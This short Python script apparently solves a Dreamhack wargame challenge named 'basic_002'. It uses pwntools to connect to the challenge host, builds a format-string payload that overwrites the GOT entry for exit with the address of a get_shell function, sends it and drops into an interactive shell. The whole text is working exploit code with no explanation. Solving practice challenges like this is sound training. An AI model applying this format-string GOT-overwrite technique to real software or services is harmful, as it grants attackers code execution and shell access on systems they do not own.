#! /usr/bin/python3

from pwn import *

p = remote("host3.dreamhack.games", 20226)
e = ELF("./basic_002")

exit_plt = e.got['exit']
get_shell = e.sym['get_shell']

payload = fmtstr_payload(1, {exit_plt : get_shell})
p.sendline(payload)
p.interactive()
